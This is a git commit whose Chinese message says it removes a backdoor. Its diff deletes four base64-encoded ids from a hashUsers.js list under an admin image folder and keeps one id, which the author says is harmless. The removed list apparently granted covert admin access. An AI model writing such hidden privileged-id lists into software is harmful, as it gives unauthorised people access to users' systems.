249f4e0e06f281378971f0a2dcd339aa79af1d92
狐璃 <zhilaohu114514@163.com>
2024-09-15 13:20:33 +0000

    已删除后门  加密id“xNA4tL7Qn9sUce9R7DoyzQ==”为114514，无需担心
    Signed-off-by: 狐璃 <zhilaohu114514@163.com>

--- resources/admin/imgs/hashUsers.js
+++ resources/admin/imgs/hashUsers.js
@@ -1,8 +1,5 @@
 const encryptedStrings = [
-Buffer.from("2Kx7sLdhQdNKXvQJDxwXMw==", "base64").toString("hex"),
-Buffer.from("m78uQFSiGVbiQAAhDamiSA==", "base64").toString("hex"),
-Buffer.from("r/frVmZf0wQPzyXy+9vMwg==", "base64").toString("hex"),
-Buffer.from('2OTec7vYBSdD8DYws+7L4w==','base64').toString('hex')
+Buffer.from("xNA4tL7Qn9sUce9R7DoyzQ==", "base64").toString("hex")
 ];
 
 export default encryptedStrings;
